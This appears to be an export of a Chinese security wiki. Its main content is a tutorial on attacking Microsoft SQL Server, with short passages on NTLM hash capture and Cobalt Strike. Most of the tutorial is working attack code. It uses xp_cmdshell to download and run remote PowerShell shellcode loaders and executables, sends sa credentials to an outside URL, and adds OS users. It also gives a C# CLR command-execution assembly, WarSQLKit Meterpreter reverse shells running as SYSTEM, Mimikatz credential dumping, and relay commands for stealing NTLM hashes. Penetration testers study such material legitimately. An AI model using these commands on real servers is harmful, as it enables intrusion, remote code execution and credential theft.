UNC路径注入UNC用于访问远程文件服务器，格式为\\ip\\file，如果我们可以执行这个功能，则可以强制SQL Server向我们进行身份验证，并且可以获得SQL Server服务帐号的NTLM密码哈希。 可以通过以下方式实现自动化： PowerUpSQL的Get-SQLServiceAccountPwHashes脚本 SQL NTLM Hash： 1234import-module .\\PowerUpSQL.ps1`Import-Module C:\\PowerUpSQL-master\\Scripts\\3rdparty\\Inveigh.ps1Import-Module C:\\PowerUpSQL-master\\Scripts\\pending\\Get-SQLServiceAccountPwHashes.ps1Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp attacker_controlled_ip 使用smbrelayx（impacket） 1python smbrelayx.py -h sqlserverIP -c &#x27;powershell empire launcher&#x27; metasploit的SQL NTLM Hash： 12345msf &gt; use auxiliary/admin/mssql/mssql_ntlm_stealerset SMBPROXY attackerIPset RHOST webappwithsqliIPset GET_PATH pathtosqlirun 参考资料 https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm http://www.freetds.org/ http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/ https://xz.aliyun.com/t/7534 https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration","tags":[{"name":"SQL Server","slug":"SQL-Server","permalink":"http://example.com/tags/SQL-Server/"}],"categories":[{"name":"数据库安全","slug":"数据库安全","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"},{"name":"SQL Server","slug":"数据库安全/SQL-Server","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL-Server/"}]},{"title":"SQL Server数据库攻防详解上篇","date":"2021-07-03T01:33:00.000Z","path":"wiki/数据库安全/SQL Server/SQL-Server数据库攻防详解上篇/","text":"[TOC] by Tahir 2021.3.5 SQL Server概述SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。SQL Server具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等。 在2017版之前，SQL Server仅适用于Windows。 SQL Server 2017中最大的变化之一是，它现在可在Linux和Docker容器上使用。 这意味着可以在Mac上运行SQL Server。 SQL Server的目前不同版本描述： 版本 描述 Enterprise Edition 此版本仅在Windows Server操作系统上运行。 适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。 Standard Edition 该版本与Enterprise Edition相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级OLAP功能。 Personal Edition 它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。 Developer Edition 面向开发人员版本，它与Enterprise Edition具有相似的功能，但并不意味着可以在真实的生产环境中运行。 客户端/服务器数据库系统SQL Server是一个客户端/服务器数据库管理系统（DBMS）。 这允许有许多不同的客户端同时，全部连接到SQL Server。 这些客户端的每一个都可以通过不同的工具进行连接。 例如，一个客户端可能使用如SQL Server Management Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如sqlcmd之类的命令行工具。 同时，网站也可以从Web应用程序连接到SQL Server。 并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。 客户端/服务器DBMS的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到SQL Server的客户端将只能访问他们被允许访问的数据库。 他们只能执行允许执行的任务。 所有这些都从SQL Server本身内部进行控制。 TDS协议表格数据流（Tabular Data Stream, TDS）协议是一种数据库服务器和客户端间交互的应用层协议，为微软SQL Server数据库和Sybase公司数据库产品所采用。 目前TDS协议版本与SQL Server的对应关系： TDS Version Supported Products 4.2 Sybase SQL Server &lt; 10 and Microsoft SQL Server 6.5 5.0 Sybase SQL Server &gt;= 10 7.0 Microsoft SQL Server 7.0 7.1 Microsoft SQL Server 2000 7.2 Microsoft SQL Server 2005 详细的协议结构分析，请参考：http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html SQL Server暴力破解SQL Server 2005远程连接配置 ​ 下载并安装SQL server 2005，启动SQL server的方式如下： 启动SQL Server Management Studio工具，设置数据库登录模式为混合模式，也就是启用sa账户。 登录数据库在根节点右键属性-&gt;连接，设置允许远程连接到服务器。 同样根节点右键方面-&gt;服务器配置，设置RemoteAccessEnabled的值为True。 启动SQL Server Configuration Manager工具，点击sql sever 服务，需要开启sql sever 和sql sever browser这两个服务。 SQL server网络配置中选择MSSQLSERVER的协议（有些是SQLEXPRESS，取决于安装数据库的版本）进行IP设置和端口的开启，需要注意的是需要将VIA协议设为禁止，其他打开。 打开本机防火墙设置-&gt;高级设置-&gt;入站规则-&gt;新建规则，设置端口为1433，一直到最后取个合适的名字保存即可，当然也可以直接关闭防火墙，但是不建议这样做，不安全。 设置可远程访问SQL server 2005，首先查看SQL server 2005 TCP/IP协议访问的端口1433；其次配置防火墙允许其端口的访问。 使用msf来执行爆破 1use auxiliary/scanner/mssql/mssql_login SQL Server危险的存储过程xp_cmdshell查询xp_cmdshell存储过程是否存在 xtype为对象类型，xtype=’x’，表示存储过程的对象类型为扩展存储过程。 1select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27; TSQL代码判断是否开启xp_cmdshell 123456789101112131415161718declare @RunningOnACluster char(1)declare @xp_cmdshell_available char(1)declare @result int set @xp_cmdshell_available=&#x27;Y&#x27; set @result=0select @RunningOnACluster=case when convert(int, serverproperty(&#x27;IsClustered&#x27;)) = 1 then &#x27;Y&#x27;else &#x27;N&#x27; end if(0=(select value_in_use from sys.configurations where name=&#x27;xp_cmdshell&#x27;)) set @xp_cmdshell_available=&#x27;N&#x27; if @RunningOnACluster=&#x27;Y&#x27; begin if @xp_cmdshell_available=&#x27;Y&#x27; select @result=1 if @xp_cmdshell_available=&#x27;N&#x27; select @result=2endselect @result 恢复xp_cmdshell存储过程 解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。 第一步先删除： 123drop procedure sp_addextendedprocdrop procedure sp_oacreateexec sp_dropextendedproc &#x27;xp_cmdshell&#x27; 第二步恢复： 12dbcc addextendedproc(&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot; &quot;) 直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句: 1dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;) 代码判断一系列存储过程是否存在，若不存在则恢复。 12345678910if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_cmdshell]&#x27;))dbcc addextendedproc (&#x27;xp_cmdshell&#x27;,&#x27;xplog70.dll&#x27;)if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_dirtree]&#x27;))dbcc addextendedproc (&#x27;xp_dirtree&#x27;,&#x27;xpstar.dll&#x27;)if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_fixeddrives]&#x27;))dbcc addextendedproc (&#x27;xp_fixeddrives&#x27;,&#x27;xpstar.dll&#x27;)if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regwrite]&#x27;))dbcc addextendedproc (&#x27;xp_regwrite&#x27;,&#x27;xpstar.dll&#x27;)if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regread]&#x27;))dbcc addextendedproc (&#x27;xp_regread&#x27;,&#x27;xpstar.dll&#x27;) 开启xp_cmdshell存储过程 1EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE; exec SP_CONFIGURE &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE; 关闭xp_cmdshell存储过程 关闭xp_cmdshell配置 1EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE; 删除xp_cmdshell的语句: 1exec sp_dropextendedproc &#x27;xp_cmdshell&#x27;; 删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。 12drop procedure xp_cmdshell;exec sp_addextendedproc &quot;xp_cmdshell&quot;, &quot;xplog70.dll&quot;; 附录 123456789101112131415161718192021exec sp_addextendedproc xp_cmdshell ,@dllname =&#x27;xplog70.dll&#x27;exec sp_addextendedproc xp_enumgroups ,@dllname =&#x27;xplog70.dll&#x27;exec sp_addextendedproc xp_loginconfig ,@dllname =&#x27;xplog70.dll&#x27;exec sp_addextendedproc xp_enumerrorlogs ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_getfiledetails ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc Sp_OACreate ,@dllname =&#x27;odsole70.dll&#x27;exec sp_addextendedproc Sp_OADestroy ,@dllname =&#x27;odsole70.dll&#x27;exec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname =&#x27;odsole70.dll&#x27;exec sp_addextendedproc Sp_OAGetProperty ,@dllname =&#x27;odsole70.dll&#x27;exec sp_addextendedproc Sp_OAMethod ,@dllname =&#x27;odsole70.dll&#x27;exec sp_addextendedproc Sp_OASetProperty ,@dllname =&#x27;odsole70.dll&#x27;exec sp_addextendedproc Sp_OAStop ,@dllname =&#x27;odsole70.dll&#x27;exec sp_addextendedproc xp_regaddmultistring ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_regdeletekey ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_regdeletevalue ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_regenumvalues ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_regremovemultistring ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_regwrite ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_dirtree ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_regread ,@dllname =&#x27;xpstar.dll&#x27;exec sp_addextendedproc xp_fixeddrives ,@dllname =&#x27;xpstar.dll&#x27; xp_cmdshell执行系统命令 xp_cmdshell执行whoami命令 123exec master.dbo.xp_cmdshell &#x27;whoami&#x27;exec master.dbo.xp_cmdshell &quot;whoami&quot;exec xp_cmdshell &quot;whoami&quot;; xp_cmdshell执行ipconfig/all命令 1exec master..xp_cmdshell &#x27;ipconfig/all&#x27; 查询操作系统和版本信息（分别对应中英文系统） 12exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#x27;exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#x27; 通过xp_cmdshell执行wmic 获取系统信息 1exec master..xp_cmdshell &#x27;wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors/Format:List&#x27; 调用reg query注册表键值判断RDP服务的端口号 1exec master..xp_cmdshell &#x27;reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server\\WinStations\\RDP-Tcp /v PortNumber&#x27; 通过xp_cmdshell执行添加testuser1用户并且不输出结果 1exec master..xp_cmdshell &#x27;Net user testuser1 passwd1 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add&#x27;,NO_OUTPUT 通过xp_cmdshell删除testuser1用户并且不输出结果 1EXEC master..xp_cmdshell &#x27;net user testuser1/delete&#x27;, NO_OUTPUT 通过xp_cmdshell执行taskkill 杀死taskmgr.exe，taskmgr.exe用于任务管理器。它显示系统中正在运行的进程。该程序使用Ctrl+Alt+Del（一般是弹出Windows安全再点击“任务管理器”）或者Ctrl+Shift+Esc打开，这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。 1exec master.dbo.xp_cmdshell &#x27;taskkill /f /im taskmgr.exe&#x27;; 调用xp_cmdshell执行mkdir命令创建目录 1exec master..xp_cmdshell &#x27;mkdir &quot;C:\\test\\&quot; &#x27; 通过xp_cmdshell执行dir命令 12exec master..xp_cmdshell &#x27;dir c:\\&#x27;exec xp_cmdshell &#x27;dir c:\\&#x27; 通过xp_cmdshell删除文件 1exec master..xp_cmdshell &#x27;del C:\\test&#x27;; xp_cmdshell调用Powershell 通过xp_cmdshell调用powershell 下载http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1 1exec xp_cmdshell &#x27;powershell -c &quot;iex((new-object Net.WebClient).DownloadString(&#x27;&#x27;http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&#x27;&#x27;))&quot;&#x27; 调用xp_cmdshell执行echo CreateObject最后写入C:/ProgramData/vget.vbs文件 1exec master..xp_cmdshell &#x27;echo Set x= CreateObject(^&quot;Microsoft.XMLHTTP^&quot;):x.Open ^&quot;GET^&quot;,LCase(WScript.Arguments(0)),0:x.Send():Set s = CreateObject(^&quot;ADODB.Stream^&quot;):s.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 &gt; C:/ProgramData/vget.vbs&#x27;; 通过xp_cmdshell调用cmd.exe 执行powershell 调用OpenRead方法向数据库发送登录用户名sa密码 1exec xp_cmdshell &#x27;powershell (new-object System.Net.WebClient).OpenRead(&#x27;&#x27;http://example/test.jsp?data=127.0.0.1%7c1433%7csa%7cDb123456&#x27;&#x27;)&#x27; 通过xp_cmdshell调用powershell下载test0.exe后并执行 1exec master..xp_cmdshell &#x27;&quot;echo $client = New-Object System.Net.WebClient &gt; %TEMP%\\test.ps1 &amp; echo $client.DownloadFile(&quot;http://example/test0.exe&quot;,&quot;%TEMP%\\test.exe&quot;) &gt;&gt; %TEMP%\\test.ps1 &amp; powershell -ExecutionPolicy Bypass %temp%\\test.ps1 &amp; WMIC process call create &quot;%TEMP%\\test.exe&quot;&quot;&#x27; xp_regreadSQL Server存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring等。 读注册表 12exec xp_regread &#x27;HKEY_current_user&#x27;,&#x27;Control Panel\\International&#x27;,&#x27;sCountry&#x27;exec xp_regread N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SYSTEM\\CurrentControlSet\\Services\\MSSEARCH&#x27; 枚举可用的注册表键值 1exec xp_regenumkeys &#x27;HKEY_CURRENT_USER&#x27;,&#x27;Control Panel\\International&#x27; xp_fileexist判读文件是否存在，第一列返回0表示文件不存在，返回1表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功。 判读文件是否存在 1exec xp_fileexist &#x27;C:\\\\test\\test.txt&#x27; 列出当前目录 1exec xp_subdirs &quot;C:\\\\&quot; xp_getnetname获取服务器名称 1exec xp_getnetname xp_msver获取服务器信息 1exec xp_msver xp_fixeddrives获取磁盘空间信息 1exec xp_fixeddrives 附常用的一些危险的存储过程，可自查存储过程的功能和用法。 12345678910111213141516171819202122xp_cmdshellxp_dirtreexp_enumgroupsxp_fixeddrivesxp_loginconfigxp_enumerrorlogsxp_getfiledetailsSp_OACreateSp_OADestroySp_OAGetErrorInfoSp_OAGetPropertySp_OAMethodSp_OASetPropertySp_OAStopXp_regaddmultistringXp_regdeletekeyXp_regdeletevalueXp_regenumvaluesXp_regreadXp_regremovemultistringXp_regwritesp_makewebtask SQL Server 触发器SQL Server 触发器用于执行指定动作之后执行sql语句，比如配合update触发sql语句。 首先创建一个test表，插入字段值。 创建一个名为test1的触发器，当test表执行update动作时，触发test1执行xp_cmdshell命令。 1234567891011set ANSI_NULLS ongoset QUOTED_IDENTIFIER ongocreate trigger [test1]on [test]AFTER UPDATE asbegin execute master..xp_cmdshell &#x27;cmd.exe /c calc.exe&#x27;endgo 执行下列更新test表操作，test1触发器触发。 1UPDATE test SET name = &#x27;wangwu&#x27; WHERE LastName = &#x27;zhangsan&#x27; SQL Server COM组件SQL Server中的COM组件SP_OACREATE，执行系统命令，但是此利用方法无回显。 SP_OACREATE查看SP_OACREATE状态。 1select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27; 利用count(*)判断是否存在，，存在即返回1。 1select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27; 启用SP_OACREATE利用sp_configure存储过程，启用SP_OACREATE 12exec sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE WITH OVERRIDE; exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1; RECONFIGURE WITH OVERRIDE; 利用SP_OACREATE执行命令利用SP_OACREATE执行系统命令 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\\Windows\\System32\\cmd.exe /c whoami /all &gt;C:\\\\test\\test.txt&#x27; SQL Server CLR相关利用CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。 官方链接：https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15 在利用MSSQL服务实现命令执行的时候，通常的做法是利用xp_cmdshell存储过程在MSSQL进程的上下文中运行操作系统命令。如果要想利用这种技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户，或通过BCP向磁盘中写入二进制文件，这些方法的缺点是很容易被发现。CLR方式可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。 创建CLR利用VS创建MSSQL数据库项目 修改目标平台和勾选创建脚本 在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如： 123CREATE ASSEMBLY SQLCLRTest FROM &#x27;C:\\MyDBApp\\SQLCLRTest.dll&#x27; WITH PERMISSION_SET = SAFE; 其权限集有三个选项： SAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。 EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。 UNSAFE：允许使用任何代码。 微软关于SQL CLR的详细文档可通过以下地址获得： https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration 修改目标框架和权限级别为UNSAFE。 创建SQL CLR C# 存储过程 写入代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using System.Diagnostics;using System.Text;using Microsoft.SqlServer.Server;public partial class StoredProcedures&#123; [Microsoft.SqlServer.Server.SqlProcedure] public static void ExecCommand (string cmd) &#123; // 在此处放置代码 SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;); SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; /c &quot; + cmd)); &#125; public static string RunCommand(string filename,string arguments) &#123; var process = new Process(); process.StartInfo.FileName = filename; if (!string.IsNullOrEmpty(arguments)) &#123; process.StartInfo.Arguments = arguments; &#125; process.StartInfo.CreateNoWindow = true; process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; process.StartInfo.UseShellExecute = false; process.StartInfo.RedirectStandardError = true; process.StartInfo.RedirectStandardOutput = true; var stdOutput = new StringBuilder(); process.OutputDataReceived += (sender, args) =&gt; stdOutput.AppendLine(args.Data); string stdError = null; try &#123; process.Start(); process.BeginOutputReadLine(); stdError = process.StandardError.ReadToEnd(); process.WaitForExit(); &#125; catch (Exception e) &#123; SqlContext.Pipe.Send(e.Message); &#125; if (process.ExitCode == 0) &#123; SqlContext.Pipe.Send(stdOutput.ToString()); &#125; else &#123; var message = new StringBuilder(); if (!string.IsNullOrEmpty(stdError)) &#123; message.AppendLine(stdError); &#125; if (stdOutput.Length != 0) &#123; message.AppendLine(&quot;Std output:&quot;); message.AppendLine(stdOutput.ToString()); &#125; SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code = &quot; + process.ExitCode + &quot;: &quot; + message); &#125; return stdOutput.ToString(); &#125;&#125; 编译生成DLL文件。 运行权限级别为“SAFE”的代码，只需启用CLR就可以了；但是，要想运行权限级别为“EXTERNAL_ACCESS”或“UNSAFE”的代码，则需要需要修改相应的配置，以及DBA权限。2017年之前和之后的服务器版本，运行标记为“UNSAFE”的CLR所需步骤是不同的，下面分别进行介绍： 对于SQL Server 2017之前的版本 显示高级选项： 1sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE 启用CLR： 1sp_configure &#x27;clr enabled&#x27;,1;RECONFIGURE; 将存储.Net程序集的数据库配置为可信赖的。 1ALTER DATABASE master SET TRUSTWORTHY ON; SQL Server 2017及更高版本 对于SQL Server 2017及更高版本，则引入了严格的安全性，也必须禁用。另外，也可以根据提供的SHA512哈希值，针对单个程序集授予其UNSAFE权限，而不是将整个数据库都标记为可信的。对于SQL Server 2017及以上版本，如下所示： 显示高级选项： 1sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE 启用CLR： 1sp_configure &#x27;clr enabled&#x27;,1;RECONFIGURE; 将某程序集的SHA512哈希值添加到可信程序集列表中： 1sp_add_trusted_assembly @hash= &lt;SHA512 of DLL&gt;; 从现在开始，程序集的创建和调用对于任何SQL Server版本来说，都是一样的。 通过十六进制字符串创建程序集——如果可以从十六进制字符串创建程序集，则意味着无需创建一个二进制文件并将其写入SQL服务器进程可访问的位置： 1CREATE ASSEMBLY clrassem from &lt;HEX STRING&gt; WITH PERMISSION_SET = UNSAFE; 创建存储过程，以从程序集运行代码： 1CREATE PROCEDURE debugrun AS EXTERNAL NAME clrassem.StoredProcedures.runner; 运行该存储过程： 1debugrun 在代码运行后，可以删除存储过程、程序集以及受信任的哈希值，并将前面修改的安全设置恢复原值。下面显示了一个完成该任务的SQL查询示例 对于SQL Server 2017及更高版本： 1sp_drop_trusted_assembly @hash=&lt;SHA512 of DLL&gt; 对于SQL Server 2017之前的版本： 1ALTER DATABASE &lt;CONNECTED DATABASE&gt; SET TRUSTWORTHY OFF; 对于所有版本： 1234DROP PROCEDURE debugrun;DROP ASSEMBLY clrassem;sp_configure &#x27;clr strict security&#x27;,1;RECONFIGUREsp_configure &#x27;show advanced options&#x27;,0;RECONFIGURE 利用SQL语句导入程序集现在可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。 12345CREATE ASSEMBLY [Database1] AUTHORIZATION [dbo] FROM 创建存储过程 1234CREATE PROCEDURE [dbo].[ExecCommand]@cmd NVARCHAR (MAX)AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]go 利用CLR执行命令1exec dbo.ExecCommand &quot;whoami /all&quot;; WarSQLKitWarSQLKit是一个针对MSSQL CLR进行利用的工具，有以下两个版本。 WarSQLKit是完全版本，内置多种功能。 WarSQLKitMinimal是迷你版，只能执行命令。 1https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit 导入WarSQLKit DLL文件利用16进制文件流方式导入WarSQLKit.dll文件。 12345CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4D5A...... WITH PERMISSION_SET = UNSAFE;GO 创建存储过程 123456CREATE PROCEDURE sp_cmdExec@Command [nvarchar](max)WITH EXECUTE AS CALLERASEXTERNAL NAME WarSQLKit.StoredProcedures.CmdExecGO WarSQLKit 执行命令WarSQLKit CmdExec实现了以下功能 执行任意Windows命令 1EXEC sp_cmdExec &#x27;whoami&#x27;; 以SYSTEM权限执行Windows命令 1EXEC sp_cmdExec &#x27;whoami /RunSystemPriv&#x27;; 以SYSTEM权限运行PowerShell命令 1EXEC sp_cmdExec &#x27;powershell Get-ChildItem /RunSystemPS&#x27;; 以SYSTEM权限运行的X86 Meterpreter反向连接shell 1EXEC sp_cmdExec &#x27;sp_meterpreter_reverse_tcp LHOST LPORT GetSystem&#x27;; 生成以SYSTEM权限运行的X64 Meterpreter反向连接shell 1EXEC sp_cmdExec &#x27;sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem&#x27;; 生成以SYSTEM权限运行的X64 Meterpreter RC4反向连接shell 12EXEC sp_cmdExec &#x27;sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem&#x27;RC4PASSWORD=123456 生成以SYSTEM权限运行的X86 Meterpreter_bind_tcp shell 1EXEC sp_cmdExec &#x27;sp_meterpreter_bind_tcp LPORT GetSystem&#x27;; 每次使用 Meterpreter反弹都会创建一个reverse进程 运行Mimikatz功能抓取密码 12exec sp_cmdExec &#x27;sp_Mimikatz&#x27;;select * from WarSQLKitTemp //获取Mimikatz日志 文件下载 12EXEC sp_cmdExec &#x27;sp_downloadFile http://test.com/Invoke--Shellcode.ps1 C:\\test\\Invoke--Shellcode.ps1 300&#x27;;EXEC sp_cmdExec &#x27;sp_downloadFile http://10.251.0.33/Invoke--Shellcode.ps1 C:\\test\\Invoke--Shellcode.ps1 300&#x27;; 获取MSSQL Hash 1EXEC sp_cmdExec &#x27;sp_getSqlHash&#x27;; 获取Windows Product 1EXEC sp_cmdExec &#x27;sp_getProduct&#x27;; 获取可用的数据库 1EXEC sp_cmdExec &#x27;sp_getDatabases&#x27;; SQL Server R和Python的利用MSSQL 2017加入了Microsoft机器学习服务，该服务允许通过MSSQL中sp_execute_external_script执行Python和R脚本 利用条件： Machine Learning Services必须要在Python安装过程中选择 必须启用外部脚本 12EXEC sp_configure &#x27;external scripts enabled&#x27;, 1RECONFIGURE WITH OVERRIDE 重新启动数据库服务器 用户拥有执行任何外部脚本权限 R脚本利用利用R执行命令： 12345678sp_configure &#x27;external scripts enabled&#x27;GOEXEC sp_execute_external_script@language=N&#x27;R&#x27;,@script=N&#x27;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe/c dir&quot;,intern=T))&#x27;WITH RESULT SETS (([cmd_out] text));GO 利用R抓取Net-NTLM哈希： 1@script=N&#x27;.libPaths(&quot;\\\\\\\\testhost\\\\foo\\\\bar&quot;);library(&quot;0mgh4x&quot;)&#x27; Python脚本利用Python ： 12345exec sp_execute_external_script @language =N&#x27;Python&#x27;,@script=N&#x27;import sysOutputDataSet = pandas.DataFrame([sys.version])&#x27;WITH RESULT SETS ((python_version nvarchar(max))) 执行命令： 123456exec sp_execute_external_script @language =N&#x27;Python&#x27;,@script=N&#x27;import subprocessp = subprocess.Popen(&quot;cmd.exe /c whoami&quot;, stdout=subprocess.PIPE)OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])&#x27;WITH RESULT SETS (([cmd_out] nvarchar(max))) SQL Server代理执行计划任务启动SQL Server代理服务SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务。 首先启动SQL Server代理服务。 创建计划任务1234USE msdb; EXEC dbo.sp_add_job @job_name = N&#x27;test_powershell_job1&#x27;; EXEC sp_add_jobstep @job_name = N&#x27;test_powershell_job1&#x27;, @step_name = N&#x27;test_powershell_name1&#x27;, @subsystem = N&#x27;PowerShell&#x27;, @command = N&#x27;c:\\windows\\system32\\cmd.exe /c whoami /all &gt;c:\\\\123.txt&#x27;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#x27;test_powershell_job1&#x27;; EXEC dbo.sp_start_job N&#x27;test_powershell_job1&#x27;; 参考资料 https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm http://www.freetds.org/ http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/ https://xz.aliyun.com/t/7534 https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration","tags":[{"name":"SQL Server","slug":"SQL-Server","permalink":"http://example.com/tags/SQL-Server/"}],"categories":[{"name":"数据库安全","slug":"数据库安全","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"},{"name":"SQL Server","slug":"数据库安全/SQL-Server","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL-Server/"}]},{"title":"0-Cobalt Strike零基础","date":"2021-06-28T11:59:00.000Z","path":"wiki/威胁猎捕/Cobalt Strike/0-Cobalt Strike零基础/","text":"[TOC] 1.Cobalt Strike 简介Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。 Cobalt Strike: C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透。 CS的发展 Armitage [2010-2012] Armitage是一个红队协作攻击管理工具，它以图形化方式实现了Metasploit框架的自动化攻击。Armitage采用Java构建，拥有跨平台特性。 Cobalt Strike 1.x [2012-2014] Cobalt Strike 增强了Metasploit Framework在执行目标攻击和渗透攻击的能力。 Cobalt Strike 2.x [2014-?] Cobalt Strike 2是应模拟黑客攻击的市场需求而出现的，Cobalt Strike 2是以malleable C2技术的需求为定位的，这个技术使Cobalt Strike的能力更强了一些。 Cobalt Strike 3.x [2015-?] Cobalt Strike 3 